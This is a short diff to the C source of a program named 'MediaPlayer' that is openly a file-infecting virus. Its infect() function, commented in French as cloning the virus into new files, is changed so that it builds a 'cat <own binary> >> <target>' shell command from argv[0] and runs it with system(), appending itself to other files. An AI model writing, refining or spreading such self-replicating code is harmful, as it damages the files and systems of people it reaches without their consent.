@@ -1,10 +1,11 @@
 #include "MediaPlayer.h"
 
-char * name;
+char **globalptr;
 
 int main(int argc, char *argv[]) {
 
         char *name = argv[0];
+        globalptr = &name;
 
         if(strcmp(argv[0],"./MediaPlayer")) {
                 char *command = argv[0];
@@ -115,10 +116,13 @@ void infect(char *fileName) {
         }
 
         // clonage du virus dans les nouveaux fichiers
-        command = "cat MediaPlayer >> ";
-        String = malloc(strlen(command) + strlen(fileName) + 1);
+        command = "cat ";
+        char *pgName = *globalptr;
+        String = malloc(strlen(command) +strlen(pgName) + strlen(" >> ") + strlen(fileName) + 1);
         if(String) {
                 strcpy(String,command);
+                strcat(String,pgName);
+                strcat(String," >> ");
                 strcat(String,fileName);
                 system(String);
         }
